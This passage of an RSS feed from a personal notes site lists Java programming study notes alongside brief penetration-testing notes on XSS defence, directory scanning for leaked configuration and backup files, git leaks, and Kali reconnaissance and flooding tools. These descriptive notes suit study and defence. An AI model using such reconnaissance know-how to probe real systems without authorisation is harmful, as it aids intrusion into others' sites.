a007方法覆盖和多态.</description></item><item><title>08-xss防御方法</title><link>https://ob.tianzhongs.ml/08-xss%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/08-xss%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95/</guid><description> 过滤输入：对用户输入的东西进行正则判断，过滤掉xss的语句等等 处理输出：对已经输入的东西进行判断，是否含有xss脚本 WAF：使用waf，不论是硬件waf还是软件waf，都有大量的过滤以及防御措施。</description></item><item><title>08-网络空间搜索引擎</title><link>https://ob.tianzhongs.ml/08-%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/08-%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/</guid><description>基础 输入OSINT ：open source intelligence 开源网络情报 前面的搜索更多的是针对于网络网页的内容，而网络空间不仅仅是对于网页内容的搜索，更多的是对于网络硬件和网络系统的内容。 比如服务器、打印机、手机、终端、网站等等的搜索 扫描的[[软件工具]]：zmap、nmap 扫描方式： ip库 枚举 怎么标识一个设备?</description></item><item><title>081_静态方法不存在方法覆盖</title><link>https://ob.tianzhongs.ml/081_%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95%E4%B8%8D%E5%AD%98%E5%9C%A8%E6%96%B9%E6%B3%95%E8%A6%86%E7%9B%96/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/081_%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95%E4%B8%8D%E5%AD%98%E5%9C%A8%E6%96%B9%E6%B3%95%E8%A6%86%E7%9B%96/</guid><description>081_静态方法不存在方法覆盖 对象之间，有了继承之后，才有方法的覆盖和多态。 方法覆盖只是针对于“实例方法”，“静态方法”没有方法意义，因为其与对象无关，只和类有关。
code
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 package a008遗留问题; import a007方法覆盖和多态.</description></item><item><title>082_私有方法无法覆盖</title><link>https://ob.tianzhongs.ml/082_%E7%A7%81%E6%9C%89%E6%96%B9%E6%B3%95%E6%97%A0%E6%B3%95%E8%A6%86%E7%9B%96/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/082_%E7%A7%81%E6%9C%89%E6%96%B9%E6%B3%95%E6%97%A0%E6%B3%95%E8%A6%86%E7%9B%96/</guid><description>082_私有方法无法覆盖 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 package a008遗留问题; public class A { private void do(){ System.</description></item><item><title>083_关于方法覆盖时的返回值类型</title><link>https://ob.tianzhongs.ml/083_%E5%85%B3%E4%BA%8E%E6%96%B9%E6%B3%95%E8%A6%86%E7%9B%96%E6%97%B6%E7%9A%84%E8%BF%94%E5%9B%9E%E5%80%BC%E7%B1%BB%E5%9E%8B/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/083_%E5%85%B3%E4%BA%8E%E6%96%B9%E6%B3%95%E8%A6%86%E7%9B%96%E6%97%B6%E7%9A%84%E8%BF%94%E5%9B%9E%E5%80%BC%E7%B1%BB%E5%9E%8B/</guid><description>083_关于方法覆盖时的返回值类型 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 public class OverrideTest07{ public static void main(String[] args){ // 一般重写的时候都是复制粘贴。不要动。不要改。 } } class Animal{ /* public double sum(int a, int b){ return a + b; } */ /* public long sum(int a, int b){ return a + b; } */ /* public int sum(int a, int b){ return a + b; } */ } class Cat extends Animal{ // 重写 // 错误: Cat中的sum(int,int)无法覆盖Animal中的sum(int,int) /* public int sum(int a, int b){ return a + b; } */ /* public double sum(int a, int b){ return a + b; } */ //错误: Cat中的sum(int,int)无法覆盖Animal中的sum(int,int) /* public long sum(int a, int b){ return a + b; } */ } // 父类 class MyClass1{ public Animal getAnimal(){ return null; } } // 子类 class MyClass2 extends MyClass1{ // 重写父类的方法 /* public Animal getAnimal(){ return null; } */ // 重写的时候返回值类型由Animal变成了Cat，变小了。（可以，java中允许） /* public Cat getAnimal(){ return null; } */ // 重写的时候返回值类型由Animal变成了Object。变大了。（不行，java中不允许） /* public Object getAnimal(){ return null; } */ } 结论：学习了多态之后你会发现 方法覆盖的返回值类型在基本数据类型必须一样，而在引用类型中（就是你class的那些类的对象），可以是你class的子类树上的类</description></item><item><title>09-目录扫描收集信息</title><link>https://ob.tianzhongs.ml/09-%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/09-%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF/</guid><description>st.10 目录扫描收集信息 目录扫描可以扫描到网站的一些文件目录结构，通过目录中的文件来获取一些信息。 部署的网站的一些敏感信息 1. 配置文件：.cfg
数据文件：.sql,.tar.gz 目录：/backup,/conf,/admin 可能会泄露的信息： 数据库用户名和密码 服务器的用户名和密码 网站源码 数据库的文件 一些特殊有用的配置文件 泄露的原因：配置不当
本地文件包含： local file inclusion（LFI） PHP 1.</description></item><item><title>091_suepr关键字</title><link>https://ob.tianzhongs.ml/091_suepr%E5%85%B3%E9%94%AE%E5%AD%97/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/091_suepr%E5%85%B3%E9%94%AE%E5%AD%97/</guid><description>091_suepr关键字 重要的结论： 当一个构造方法第一行：既没有this()又没有super()的话，默认会有一个super();表示通过当前子类的构造方法调用父类的无参数构造方法。所以必须保证父类的无参数构造方法是存在的。
super和this this() 通过当前的构造方法去调用“本类”中其它的构造方法 super() 通过当前的构造方法去调用“父类”中的构造方法（相当于把父类的构造方法代码部分复制过来），目的是：创建子类对象的时候，先初始化父类型特征，父类的构造方法是一定会执行的,所以object的构造方法一定会执行 由于this和super都只能出现在构造方法第一行，所以不能同时出现在一个构造方法中 都能出现在实例方法和构造方法中。 不能使用在静态方法中。 目的都是：代码复用。 super后面必须跟.，和this不同，super不保存内存地址，只是表示了父对象的一部分特征，this可以直接打印输出内存地址，而super不行，必须super.xxxx的方式使用，或者super()的方式使用。 [!super()] 表示通过子类的构造方法调用父类的构造方法。 模拟现实世界中的这种场景：要想有儿子，需要先有父亲。 父类的构造方法一定是会执行的</description></item><item><title>092_构造方法执行顺序</title><link>https://ob.tianzhongs.ml/092_%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95%E6%89%A7%E8%A1%8C%E9%A1%BA%E5%BA%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/092_%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95%E6%89%A7%E8%A1%8C%E9%A1%BA%E5%BA%8F/</guid><description>092_构造方法执行顺序 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 /* 判断程序的输出结果 1 3 6 5 4 在java语言中不管是是new什么对象，最后老祖宗的Object类的无参数构造方法 一定会执行。（Object类的无参数构造方法是处于“栈顶部”） 栈顶的特点： 最后调用，但是最先执行结束。 后进先出原则。 大家要注意： 以后写代码的时候，一个类的无参数构造方法还是建议大家手动的写出来。 如果无参数构造方法丢失的话，可能会影响到“子类对象的构建”。 */ public class SuperTest02{ public static void main(String[] args){ new C(); } } /* class Object{ public Object(){ } } */ class A extends Object{ static{ System.</description></item><item><title>093_使用super调用父类方法</title><link>https://ob.tianzhongs.ml/093_%E4%BD%BF%E7%94%A8super%E8%B0%83%E7%94%A8%E7%88%B6%E7%B1%BB%E6%96%B9%E6%B3%95/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/093_%E4%BD%BF%E7%94%A8super%E8%B0%83%E7%94%A8%E7%88%B6%E7%B1%BB%E6%96%B9%E6%B3%95/</guid><description>093_使用super调用父类方法 super不仅可以调用父类的属性，还可以调用父类的方法。
super.属性名 访问父类的属性 super.方法名(实参) 访问父类的方法 super(实参) 调用父类的构造方法
eg 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 /* 判断程序的输出结果 1 3 6 5 4 在java语言中不管是是new什么对象，最后老祖宗的Object类的无参数构造方法 一定会执行。（Object类的无参数构造方法是处于“栈顶部”） 栈顶的特点： 最后调用，但是最先执行结束。 后进先出原则。 大家要注意： 以后写代码的时候，一个类的无参数构造方法还是建议大家手动的写出来。 如果无参数构造方法丢失的话，可能会影响到“子类对象的构建”。 */ public class SuperTest02{ public static void main(String[] args){ new C(); } } public static void main(String[] args){ /* Cat move!</description></item><item><title>10-git信息收集</title><link>https://ob.tianzhongs.ml/10-git%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/10-git%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</guid><description>集中化的VCS：Centralized Version Control Systems：CVCS SVN CVS 去中心化的CVS：Distributed Version Control System–DVCS Github、Gitlab、码云 Git —Linus Torwalds #question 为什么git会导致信息泄露？ 把私有仓库/隐私文件提交到了github 部署项目的时候，不小心把 .</description></item><item><title>100-方法定义static</title><link>https://ob.tianzhongs.ml/053_%E6%96%B9%E6%B3%95%E5%AE%9A%E4%B9%89static/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/053_%E6%96%B9%E6%B3%95%E5%AE%9A%E4%B9%89static/</guid><description>100-方法定义static ```java public static void jiecheng(int a) {  int aa=1;
 for (int i = 1; i &amp;lt;= a; i++) {</description></item><item><title>101_学习总结</title><link>https://ob.tianzhongs.ml/101_%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/101_%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</guid><description>#Java基础
前序 通过大致17天的学习，学习了javase的基础，让我对java的一些基本特点或者使用有了轮廓。 接下来将要学习java进阶，所以就目前的学习做一下总结。
一、理论 在理论方面学习了
java开发工具包JDK，包括了JREJava运行环境（包括了JVM虚拟机） 学习了java程序的执行过程：源代码执行，生成字节码，JVM解释为二进制文件，交给操作系统，操作系统与硬件进行交互 基本的环境变量设置：sysdm.cpl 三种注释方法 public class和class的区别：一个文件最多一个public class，但可以有无数个class，public的class必须和文件名一致 二、铺垫 变量名定义：驼峰命名；基本的关键字50个 javadoc的基本使用：需要配合文档注释 不同数据类型所占用的字节大小：1248 4812 （byte short int long；float double boolean char） Scanner的使用，基本的导包方式（和那个python好像一样） 方法的调用：在一个类中，可以直接写想要调用的方法，如果不在一个类中，则采用：类名.</description></item><item><title>11-信息收集总结</title><link>https://ob.tianzhongs.ml/11-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%BB%E7%BB%93/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/11-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%BB%E7%BB%93/</guid><description>书籍 https://img.doingnothing.online/wangan/2.12-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%BB%E7%BB%93%EF%BC%88%E6%97%A0%E6%B6%AF%EF%BC%89.pdf kail信息收集工具 kali的软件清单https://tools.kali.org/tools-listing
中文翻译 https://github.com/Jack-Liang/kalitools
存活主机识别 ​ arping 将ARP和/或ICMP请求发送到指定的主机 fping fping可以在命令行中指定要ping的主机数量范围 hping3 ​ TCP/IP数据包组装/分析工具 ​ 可以发起flood攻击 ​ masscan 最快的互联网端口扫描器 thcping6 atk6-thcping6 可以攻击IPV6和ICMP6固有的协议弱点 路由分析 netdiscover</description></item><item><title>111_Idea的基本使用</title><link>https://ob.tianzhongs.ml/111_Idea%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/111_Idea%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</guid><description>111_Idea的基本使用 .1. module：模块的创建
dae的快捷键 作用 快捷键 新建class 选中文件夹 alt +insert（笔记本需要按住fn） 打开设置set ctrl+alt+s 最大窗口 ctrl+shift+F12 构造器，get、set方法 alt+insert 折叠打开代码块 alt+←或者→ 切换窗口 alt + 标号数字 提示方法的参数 ctrl + p 注释 单行注释：ctrl + / 多行注释：ctrl + shift + / 复制一行 ctrl + d 删除行 ctrl +y 纠错 alt+Enter 查看一个类的属性和方法 ctrl + F12 光标停留在红色，创建方法 alt +enter，（方法默认是private，可以修改一下）</description></item><item><title>112_java相关帮助文档</title><link>https://ob.tianzhongs.ml/112_java%E7%9B%B8%E5%85%B3%E5%B8%AE%E5%8A%A9%E6%96%87%E6%A1%A3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/112_java%E7%9B%B8%E5%85%B3%E5%B8%AE%E5%8A%A9%E6%96%87%E6%A1%A3/</guid><description>112_java相关帮助文档 [!bug]+ java帮助文档
好用的 http://www.matools.com/api/java8 英文版本 https://tool.oschina.net/apidocs/api#A 看不懂的 https://www.w3cschool.cn/java/dict 效果不错的 https://itmyhome.com/java-api/ W3c的 https://www.w3cschool.cn/java/dict UML ![[../22u异常处理/222.UML 统一建模语言]]</description></item><item><title>121_final</title><link>https://ob.tianzhongs.ml/121_final/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/121_final/</guid><description>121_final final是一个关键字，表示最终的、不可变的。 final一般用来修饰变量，方法，类
作用 final修饰的局部变量只能赋一次值（局部变量必须[[../../../../assets/Pasted image 20220712105836.png|手动赋值]]） final修饰的方法，无法被覆盖、被重写 final修饰的类，无法被继承 final修饰的实例变量，系统不负责赋默认值，需要你自己赋值，要么在定义的时候赋值，要么在构造方法中进行赋值 final上修饰的实例变量一般和static联合使用是，成为常量，存储在方法区，所有的实例公用一份。 1 public static final double PI=3.1415926; ``</description></item><item><title>122_final修饰的引用型变量</title><link>https://ob.tianzhongs.ml/122_final%E4%BF%AE%E9%A5%B0%E7%9A%84%E5%BC%95%E7%94%A8%E5%9E%8B%E5%8F%98%E9%87%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/122_final%E4%BF%AE%E9%A5%B0%E7%9A%84%E5%BC%95%E7%94%A8%E5%9E%8B%E5%8F%98%E9%87%8F/</guid><description>122_final修饰的引用型变量 实例化的对象的变量是一个引用型变量，这个变量所指向的是这个对象在堆内存中的地址 通过final对其进行修饰，那么这个引用型变量将不能再指向新的对象地址，但是通过set方法区修改这个引用型变量所指向对象的内部属性
1 2 3 4 5 6 7 8 9 10 public class FinalTest01 { public static void main(String[] args) { final User u1=new User(); u1.</description></item><item><title>123_final修饰实例变量</title><link>https://ob.tianzhongs.ml/123_final%E4%BF%AE%E9%A5%B0%E5%AE%9E%E4%BE%8B%E5%8F%98%E9%87%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/123_final%E4%BF%AE%E9%A5%B0%E5%AE%9E%E4%BE%8B%E5%8F%98%E9%87%8F/</guid><description>123_final修饰实例变量 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public class FinalTest03 { public static void main(String[] args) { User1 u3=new User1(); System.</description></item><item><title>131_抽象类</title><link>https://ob.tianzhongs.ml/131_%E6%8A%BD%E8%B1%A1%E7%B1%BB/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/131_%E6%8A%BD%E8%B1%A1%E7%B1%BB/</guid><description>131_抽象类 ![[../../../../assets/Pasted image 20220712170300.png]]
什么是抽象类？ 类和类之前具有共同特征，把共同特征提取出来，形成的就是抽象类。抽象类本身不存在，所以抽象类无法创建对象，无法实例化。 抽象类的数据类型 引用数据类型 抽象类是用来继承的，所以final和abstract不能结合使用 抽象类的子类可以是抽象类 抽象类无法实例化，但是可以有构造方法，这个构造方法是供子类使用的 定义的语法 1 2 3 [修饰符列表] abstract class 类名{ 类体; }</description></item><item><title>132_抽象方法</title><link>https://ob.tianzhongs.ml/132_%E6%8A%BD%E8%B1%A1%E6%96%B9%E6%B3%95/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/132_%E6%8A%BD%E8%B1%A1%E6%96%B9%E6%B3%95/</guid><description>132_抽象方法 抽象方法表示没有实现的方法，没有方法体的方法 1 public abstract void doSome(); `` 抽象类不一定有抽象方法，但是抽象方法只能出现在抽象类中。 一个非抽象的类继承抽象类，必须将抽象类中的抽象方法覆盖，进行实现。（因为抽象方法只能卸载抽象类中，所以才需要这样）</description></item><item><title>133_例子</title><link>https://ob.tianzhongs.ml/133_%E4%BE%8B%E5%AD%90/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/133_%E4%BE%8B%E5%AD%90/</guid><description>133_例子 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 public class AbstractTest01 { public static void main(String[] args) { Animal c1=new Cat();//向上转型 c1.</description></item><item><title>134_面试题</title><link>https://ob.tianzhongs.ml/134_%E9%9D%A2%E8%AF%95%E9%A2%98/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/134_%E9%9D%A2%E8%AF%95%E9%A2%98/</guid><description>134_面试题 [!java语言中凡是没有方法体的方法都是抽象方法吗？] 错误。 Object类中的很多方法都没有方法体，都是以“；”结尾。但是他们都不是抽象方法。 比如public native int hashCode(); 这个方法底层调用了C++写的动态链接库程序，前面修饰符列表中没有abstract，有一个native，表示调用JVM本地程序</description></item><item><title>141_接口</title><link>https://ob.tianzhongs.ml/141_%E6%8E%A5%E5%8F%A3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/141_%E6%8E%A5%E5%8F%A3/</guid><description>141_接口 语法格式 1 2 3 [修饰符列表] interface 接口名{ } 基础语法 接口等于常量+抽象方法 接口也是一种“引用数据类型”，编译之后，也是一个class字节码文件 接口是完全抽象的（抽象类是半抽象的），也可以说接口是特殊的抽象类 接口支持继承，且支持多继承 接口中只包含两部分内容：1. 常量；2.抽象方法 接口中的所有元素都是public修饰的 public abstract可以省略不写 接口中都是抽象方法，所以不能有方法体 接口中的常量 public static final也可以省略不写 接口的使用 类和接口之间叫做实现，可以看做继承 继承用extens关键字完成 实现用implement关键字完成 接口中不能有方法体 接口可以继承多个接口 当一个非抽象的类实现接口的话，必须对接口中的抽象方法进行 方法覆盖，同时进行方法覆盖的要求和继承中方法覆盖的要求一样，访问权限只能更高 ，不能更低，一般是public 接口可以继承接口，类可以实现接口，抽象类不可以继承接口 一个类可以实现多个接口（弥补了java中类和类只支持单继承的缺陷，类似于多继承） 接口与接口之间没有继承关系，也可以强制类型转换，编译没错，但是陨星的时候可能 会出现ClassCastException异常，建议接口转型之前进行instanceof进行判断 extends和implements可以共存，extends在前，implements在后 [[044.</description></item><item><title>142_接口eg1</title><link>https://ob.tianzhongs.ml/142_%E6%8E%A5%E5%8F%A3eg1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/142_%E6%8E%A5%E5%8F%A3eg1/</guid><description>142_接口eg1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 public class Test { public static void main(String[] args) { //调用接口中的常量, System.</description></item><item><title>143_一个类实现多个接口</title><link>https://ob.tianzhongs.ml/143_%E4%B8%80%E4%B8%AA%E7%B1%BB%E5%AE%9E%E7%8E%B0%E5%A4%9A%E4%B8%AA%E6%8E%A5%E5%8F%A3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/143_%E4%B8%80%E4%B8%AA%E7%B1%BB%E5%AE%9E%E7%8E%B0%E5%A4%9A%E4%B8%AA%E6%8E%A5%E5%8F%A3/</guid><description>143_一个类实现多个接口 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 public class Test01 { public static void main(String[] args) { D d1=new D(); d1.</description></item><item><title>144_extends和implements同时出现</title><link>https://ob.tianzhongs.ml/144_extends%E5%92%8Cimplements%E5%90%8C%E6%97%B6%E5%87%BA%E7%8E%B0/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/144_extends%E5%92%8Cimplements%E5%90%8C%E6%97%B6%E5%87%BA%E7%8E%B0/</guid><description>144_extends和implements同时出现 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 public class Test02 { public static void main(String[] args) { Flyable c1=new Cat();//创建对象，父类型指向子对象。多态 c1.</description></item><item><title>145_接口在开发中的作用</title><link>https://ob.tianzhongs.ml/145_%E6%8E%A5%E5%8F%A3%E5%9C%A8%E5%BC%80%E5%8F%91%E4%B8%AD%E7%9A%84%E4%BD%9C%E7%94%A8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/145_%E6%8E%A5%E5%8F%A3%E5%9C%A8%E5%BC%80%E5%8F%91%E4%B8%AD%E7%9A%84%E4%BD%9C%E7%94%A8/</guid><description>145_接口在开发中的作用 作用 将调用者和实现者解耦合。 调用者面向接口调用，实现者面向接口编写实现。</description></item><item><title>146_is_a、has_a、like_a</title><link>https://ob.tianzhongs.ml/146_is_ahas_alike_a/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/146_is_ahas_alike_a/</guid><description>146_is_a、has_a、like_a 凡是满足“has a”来描述的，表示“关联关系”，统一以属性的方式存在。 1 2 3 class A{ B b } `` 1 2 3 4 class Custer{ //每个顾客手里都有一个菜单，菜单就是另一个接口类，包含了很多的做菜方法 FootMenu footMenu;//顾客有一个菜单，所以设置为属性 } 凡是满足“is a”来描述的，表示可以设置为继承。 1 class A extend B `` 1 2 class Cat extends Animal{ } `` 翻译满足“like a”，表示实现关系，通常是类实现接口。 1 2 class A implements B{ } `` 1 2 3 4 class ChineseCooker implements FoodMenu{ //厨师像一个菜单一样，实现了菜单中的具体方法，所以可以通过类实现接口中的方法 public void cook(){} }</description></item><item><title>147_抽象类和接口的区别</title><link>https://ob.tianzhongs.ml/147_%E6%8A%BD%E8%B1%A1%E7%B1%BB%E5%92%8C%E6%8E%A5%E5%8F%A3%E7%9A%84%E5%8C%BA%E5%88%AB/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/147_%E6%8A%BD%E8%B1%A1%E7%B1%BB%E5%92%8C%E6%8E%A5%E5%8F%A3%E7%9A%84%E5%8C%BA%E5%88%AB/</guid><description>147_抽象类和接口的区别 抽象：抽象类是半抽象的；接口是完全抽象的 构造方法：抽象类中有构造方法；接口中没有构造方法 继承：类与类之间只能单继承；接口与接口之间支持多继承。 实现与继承：一个类可以同时实现（implements）多个接口；一个抽象类只能继承（extends）一个类（单继承） 定义：接口中只允许常量和抽象方法 使用频率：一般接口比抽象类多，抽象类使用的少。接口一般是对行为的抽象，接口就是为了扩展能力。</description></item><item><title>148_接口实现eg2厨师炒菜</title><link>https://ob.tianzhongs.ml/148_%E6%8E%A5%E5%8F%A3%E5%AE%9E%E7%8E%B0eg2%E5%8E%A8%E5%B8%88%E7%82%92%E8%8F%9C/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/148_%E6%8E%A5%E5%8F%A3%E5%AE%9E%E7%8E%B0eg2%E5%8E%A8%E5%B8%88%E7%82%92%E8%8F%9C/</guid><description>148_接口实现eg2厨师炒菜 书写接口方法，用来描写具体的做菜方法 1 2 3 4 5 6 //菜单 //用来描述具体的菜单做的东西 public interface FootMenu { void Yuxiangrousi(); void Fanqiechaodan(); } 用类去实现接口中的具体方法 1 2 3 4 5 6 7 8 9 //定义厨师类去具体实现菜单接口中的方法 public class ChineseCooker implements FootMenu{ public void Yuxiangrousi(){ System.</description></item><item><title>151_package</title><link>https://ob.tianzhongs.ml/151_package/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/151_package/</guid><description>151_package 作用 package是java中的包机制，包机制的作用是为了方便程序的管理。不同功能的类分别存放在不同的包下。 package的使用 package是一个IE关键字，后面加包名 只允许出现在java源代码第一行 package com.bkd.jase.chapter17 包名的命名规范 公司域名倒序+项目名+模块名+功能名 对于package的程序，Java程序的运行过程 编译 和以前一样 javac -d 文件名 运行 在项目的根文件夹，采用 包名.</description></item><item><title>152_import机制的使用</title><link>https://ob.tianzhongs.ml/152_import%E6%9C%BA%E5%88%B6%E7%9A%84%E4%BD%BF%E7%94%A8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/152_import%E6%9C%BA%E5%88%B6%E7%9A%84%E4%BD%BF%E7%94%A8/</guid><description>152_import机制的使用 当两个类不在一个包内，当 需要调用另一个包的文件时，就需要使用import导入别的包 特殊：java.lang这个包下的类不需要使用，因为他默认是自动导入的
eg ![[../../../../assets/Pasted image 20220713153048.png]]
运行output ![[../../../../assets/Pasted image 20220713153625.png]]
如果不导包，可以采用
1 包名.类名 名称=new 包名.类名 来使用别的包的类</description></item><item><title>161_访问控制权限</title><link>https://ob.tianzhongs.ml/161_%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%9D%83%E9%99%90/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/161_%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%9D%83%E9%99%90/</guid><description>161_访问控制权限 四种权限 private 私有的
只能在本类中使用，可以通过封装的方式让外部进行访问 public 公开的
任何位置都可以访问 默认，什么都不写
只能在本类或同包下访问 protected 受保护的</description></item><item><title>171_Object类中的常用方法</title><link>https://ob.tianzhongs.ml/171_Object%E7%B1%BB%E4%B8%AD%E7%9A%84%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/171_Object%E7%B1%BB%E4%B8%AD%E7%9A%84%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95/</guid><description>171_Object类中的常用方法 JDK库的根类：Object
怎么去查找：
源代码中找 查阅java 帮助文档，可以通过javadoc来生成 ![[../../../../assets/Pasted image 20220713193605.png]] 额外知识：
[!API] 应用程序编程接口。（Application Program Interface) 整个JDK的类库就是一个javase的API.</description></item><item><title>172_重写equals方法eg</title><link>https://ob.tianzhongs.ml/172_%E9%87%8D%E5%86%99equals%E6%96%B9%E6%B3%95eg/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/172_%E9%87%8D%E5%86%99equals%E6%96%B9%E6%B3%95eg/</guid><description>172_重写equals方法eg 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 import com.</description></item><item><title>181_匿名内部类</title><link>https://ob.tianzhongs.ml/181_%E5%8C%BF%E5%90%8D%E5%86%85%E9%83%A8%E7%B1%BB/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/181_%E5%8C%BF%E5%90%8D%E5%86%85%E9%83%A8%E7%B1%BB/</guid><description>181_匿名内部类 tag: 装逼 注意 ![[182.匿名内部类eg#^8442de]] ![[182.匿名内部类eg#^85d701]]</description></item><item><title>182_匿名内部类eg</title><link>https://ob.tianzhongs.ml/182_%E5%8C%BF%E5%90%8D%E5%86%85%E9%83%A8%E7%B1%BBeg/</link><pubDate>Mon, 01 Jan 0001 00:00:00 